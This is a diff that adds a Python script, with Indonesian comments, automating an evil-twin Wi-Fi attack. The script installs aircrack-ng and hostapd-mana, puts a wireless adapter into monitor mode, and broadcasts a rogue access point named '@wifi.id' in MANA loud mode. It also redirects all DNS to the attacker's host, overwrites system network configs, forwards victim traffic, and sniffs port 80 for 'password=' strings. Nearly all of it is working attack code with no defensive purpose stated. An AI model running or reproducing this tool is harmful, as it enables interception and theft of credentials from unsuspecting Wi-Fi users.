@@ -1,0 +1,108 @@
+import netifaces
+import os
+from getmac import get_mac_address
+import tkinter as tk
+from tkinter import ttk
+
+
+mac = "00:c0:ca"
+tools = ["aircrack-ng","iptables","nginx","tcpflow"]
+#===================================REQUIREMENT=============================
+def tool_awal():
+    for i in tools:
+        os.system("apt-get -y install "+ str(i))
+        print("=================================")
+
+def mana():
+    os.system("git clone https://github.com/sensepost/hostapd-mana")
+    os.system("make -C hostapd-mana/hostapd")
+    os.system("cd hostapd-mana/hostapd && make install")
+
+def dhcp_server():
+    os.system("apt-get install dnsmasq")
+    print("==================================")
+    f = open("/etc/dnsmasq.conf","w+")
+    f.write("interface=wlan0mon\n"
+            "dhcp-range=10.0.0.10,10.0.0.250,12h\n"
+            "dhcp-option=3,10.0.0.1\n"
+            "dhcp-option=6,10.0.0.1\n"
+            "server=8.8.8.8\n"
+            "log-queries\n"
+            "log-dhcp\n"
+            "listen-address=127.0.0.1\n"
+            "address=/#/10.0.0.1")
+    n = open("/etc/NetworkManager/NetworkManager.conf","w+")
+    n.write("[main]\n"
+            "plugins=ifupdown,keyfile\n"
+            "\n"
+            "[ifupdown]\n"
+            "managed=false\n"
+            "\n"
+            "[device]\n"
+            "wifi.scan-rand-mac-address=no")
+    print("KONFIGURASI OKE")
+#===================================INTERFACE=========================
+list_iface=[]
+def daftar_iface():
+    p = netifaces.interfaces()
+    for i in range(len(p)):
+        list_iface.insert(i, p[i])
+
+list_mac=[]
+def daftar_mac():
+    for i in list_iface:
+        q = get_mac_address(interface=i)
+        list_mac.append(q)
+        
+def perbandingan():
+    for x in list_mac:
+        if str(x[:8]) == mac:
+            print("INTERFACE FOUND!")
+            y = list_mac.index(x)
+            os.system("airmon-ng start "+ list_iface[y])
+            os.system("ifconfig wlan0mon down")
+            os.system("iw reg set US")
+            os.system("ifconfig wlan0mon up")
+#==============================HOST-APD MANA===========================
+def hostapd_config():
+    m = open("hostapd-mana/hostapd/hostapd.conf","w+")
+    m.write("interface=wlan0mon\n"
+            "driver=nl80211\n"
+            "ssid=@wifi.id\n"
+            "hw_mode=g\n"
+            "channel=11\n"
+            "enable_mana=1\n"
+            "mana_loud=1")
+    print("KONFIGURASI OKE")
+    #os.system("killall dnsmasq dhcpd isc-dhcp-server")
+    os.system("gnome-terminal -e 'bash -c \"dnsmasq -C /etc/dnsmasq.conf -d; exec bash\"'")
+    os.system("gnome-terminal -e 'bash -c \"cd hostapd-mana/hostapd/ && hostapd hostapd.conf; exec bash\"'")
+    
+    
+def ifconfig():
+    os.system("ifconfig wlan0mon up 10.0.0.1 netmask 255.255.255.0")
+    os.system("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1")
+    os.system("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
+    os.system("iptables --append FORWARD --in-interface wlan0mon -j ACCEPT")
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    print("IFCONFIG OK!")
+def spoof():
+    #os.system("service nginx restart")
+    #os.system("service apache2 restart")
+    os.system("/etc/init.d/mysql start")
+    os.system("gnome-terminal -e 'bash -c \"tcpflow -i any -C -g port 80 | grep -i 'password='; exec bash\"'")
+    
+
+#==============================OPERASIONAL=================================
+def mulai():
+    tool_awal()
+    mana()
+    dhcp_server()
+    daftar_iface()
+    daftar_mac()
+    perbandingan()
+    hostapd_config()
+    ifconfig()
+    spoof()
+
+mulai()
